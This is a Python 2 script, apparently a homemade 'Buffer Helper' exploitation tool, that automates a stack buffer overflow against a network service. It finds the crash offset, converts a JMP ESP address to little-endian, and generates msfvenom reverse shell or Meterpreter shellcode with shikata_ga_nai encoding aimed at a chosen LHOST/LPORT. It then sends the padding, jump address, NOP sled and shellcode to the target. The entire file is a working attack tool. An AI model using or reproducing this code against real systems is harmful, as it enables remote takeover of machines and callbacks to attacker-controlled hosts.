#!/usr/bin/env python
# -*- coding: utf-8 -*-



import random
import string
import socket 
import json
import time
import subprocess
import readline

class Buffer_Over:
     def __init__(self):
         self.Banner() 
         self.string_ramdon()
         self.connect_servser()
         self.hexadecimal() 
         self.payload("{}","{}","{}")
         self.little_endian()        
         self.attack_all()
	 self.Banner()

     def string_ramdon(self):
         try:
	 	 self.Requst_String = str(raw_input("\n[+]Enter your reguset:")).strip()
		 self.length_String =len(self.Requst_String)
		 time.sleep(2)
		 print "\n[+]character length is :",self.length_String
		 value = string.ascii_letters
		 self.Random_String = "".join(random.choice(value)for i in range(self.length_String)).lower()  
                 self.Random_String = bytearray(self.Random_String)
		 print "\n[+]Generated String is:",(self.Random_String).strip()
		 print '\n[+]The New character length is:',len(self.Random_String )
         except KeyboardInterrupt:
                  print "\n\n[+]-------------------------{GOOD BYE}--------------------------[+]"
                  exit()
 
     def connect_servser(self):
          while True:
	        try:
	            socket_1= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		    self.server_ip=str(raw_input("\n[+]server ip : "))
		    time.sleep(2)
		    self.server_port=int(raw_input("\n[+]server port :"))
		    socket_1.connect((self.server_ip,self.server_port))
		    data = socket_1.recv(1023)
		    socket_1.send( self.Random_String + '\r\n')
		    time.sleep(2)
	      	    print "\n[+]data send successful...!!!"
		    socket_1.close()
		    break
	        except Exception:
		    print "\n[+]something goes wrong try again..!!**!! "
                except KeyboardInterrupt:
                  print "\n\n[+]-------------------------{GOOD BYE}--------------------------[+]"
                  exit()

     def hexadecimal (self):                                                                           
          while True:
                 try: 
		    self.hexadecimal = str(raw_input("\n[+]Enter hexadecimal Crach address: ")).upper()
                    self.ASCII1 ="".join(reversed([self.hexadecimal[i:i+2] for i in range(0, len(self.hexadecimal), 2)]))                
		    self.ASCII = ''.join(chr(int(self.ASCII1[i:i+2], 16)) for i in range(0, len(self.ASCII1), 2))
		    if self.ASCII in  self.Random_String:
		       print "\n[+]The ASCII Value  is : ",self.ASCII
		       time.sleep(2)
		       self.location = self.Random_String.find(self.ASCII)
		       
		       print "\n[+]Exact satch at offset : ",self.location
	               break
                    else:
	               print "\n[+]WE NOT FOUNF THE VALUE IN OUR STRING  "
	               self.hexadecimal = str(raw_input("\n[+]Enter hexadecimal Crach address : "))                  
                 except Exception:
		       print "\n[+]something goes wrong try again..!!**!! "
                 except KeyboardInterrupt:
                      print "\n\n[+]-------------------------{GOOD BYE}--------------------------[+]"
                      exit() 
     def payload(self,payload, LHOST, LPORT):

         print "\nSelect Payload"
         print "[+] 1 = windows/shell_reverse_tcp"
         print "[+] 2 = windows/meterpreter_reverse_tcp"
         print "[+] 3 = windows/meterpreter_reverse_http"
         print "[+] 4 = windows/meterpreter_reverse_https"
          
         while True:
               try: 
                   self.payload =int(raw_input("\n[+]Select the Payload : ")) 
                   LHOST =str(raw_input("\n[+] LHOST: "))
                   LPORT=int(raw_input("\n[+] LPORT: ")) 
		   if self.payload == 1:
	              self.payload = "windows/shell_reverse_tcp  -e x86/shikata_ga_nai  -b \\x00\\x0a\\x0d -f c "
	              print"\n[+]PAYLOAD IS : ",self.payload
		   if self.payload == 2:
	              self.payload = "windows/meterpreter/reverse_tcp  -e x86/shikata_ga_nai -f python "
	              print"\n[+]PAYLOAD IS : ",self.payload
		   if self.payload == 3:
		      self.payload = "windows/meterpreter_reverse_http -e x86/shikata_ga_nai  -f python "
	              print"\n[+]PAYLOAD IS : ",self.payload
		   if self.payload == 4:
		      self.payload = "windows/meterpreter_reverse_https -e x86/shikata_ga_nai -f python"
		      print"\n[+]PAYLOAD IS : ",self.payload	                        		 
		   msf_path = "/usr/share/metasploit-framework/"	     
		   data = subprocess.Popen(["%smsfvenom -p %s LHOST=%s LPORT=%s --platform Windows"
	 % (msf_path,self.payload,LHOST,LPORT)], stdout=subprocess.PIPE, shell=True)
                   data = data.communicate("n\n")[0]
                   data = data.replace(";", "") 
                   data = data.replace("+","")                
                   data = data.replace("buf =","")
                   data = data.replace("unsigned char buf[] = ","")               
                   data = data.rstrip()                                
                   self.shellcode= data 
                   print "\n[+]payload is radey-----!!!!!"
                   break    
               except Exception:
		   print "\n[+]something goes wrong try again..!!**!!"                 
               except KeyboardInterrupt:
                  print "\n\n[+]-------------------------{GOOD BYE}--------------------------[+]"
                  exit()
     def little_endian(self):
             try:
                jump= raw_input("\n[+] Enter JMP ESP addrsss HEX  : ").upper()
                self.jump_address = "".join(reversed([jump[i:i+2] for i in range(0, len(jump), 2)]))
                self.display =self.jump_address# for print olnly
                self.display = " ".join("\\x%s"%self.display[i:i+2] for i in range(0, len(self.display), 2))
                self.display= self.display.replace(" ", "")
                time.sleep(2)
                self.jump_address = ('0'*(len(self.jump_address) % 2) +self.jump_address).decode('hex') 
                print "\n[+]little endian JMP ESP  is : ", self.display
             except KeyboardInterrupt:
                print "\n\n[+]-------------------------{GOOD BYE}--------------------------[+]"
                exit()

     def attack_all(self):
          while True:
	       try:                  
                   socket_2 =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                   Start_string = self.location*"A"        
                   NO_Operation = len(self.Requst_String) - self.location  -  len( self.jump_address) 
                   NO_Operation =  NO_Operation*"\x90"   
                   attack = Start_string+self.jump_address+ NO_Operation +  self.shellcode 
                   print '\n[+] attack =',len(Start_string),'of "A" + JMP ESP =', self.display ,'+',NO_Operation.count("\x90"),'of("\\x90") '" +", self.shellcode
                   time.sleep(2)
                   print "\n[+]conncet server ip is  : ", self.server_ip
                   time.sleep(2)
                   print "\n[+]conncet server port is  : ", self.server_port         
                   socket_2.connect((self.server_ip,self.server_port))
                   data_recv  = socket_2.recv(1024)
                   socket_2.send( attack + '\r\n')
                   time.sleep(2)
	           print "\n[+]data send successful...!!!"
                   socket_2.close()
                   print "\n[+]-------------------------{THANK YOU}--------------------------[+]"              
                                                      
	           break	
               except Exception:
		   print "\n[+]something goes wrong try again..!!**!!" 
                   stop = str(raw_input("\n[+]Enter any key to connect ???"))
               except KeyboardInterrupt:
                  print "\n\n[+]-------------------------{GOOD BYE}--------------------------[+]"
                  exit()
                  
     def Banner(self):
           print"""
 ____         __  __             _   _      _                  
| __ ) _   _ / _|/ _| ___ _ __  | | | | ___| |_ __   ___ _ __  
|  _ \| | | | |_| |_ / _ \ '__| | |_| |/ _ \ | '_ \ / _ \ '__| 
| |_) | |_| |  _|  _|  __/ |    |  _  |  __/ | |_) |  __/ |    
|____/ \__,_|_| |_|  \___|_|    |_| |_|\___|_| .__/ \___|_|    
                                             |_|        
"""   
                  
                  
if __name__ == '__main__':
   Buffer_Over()
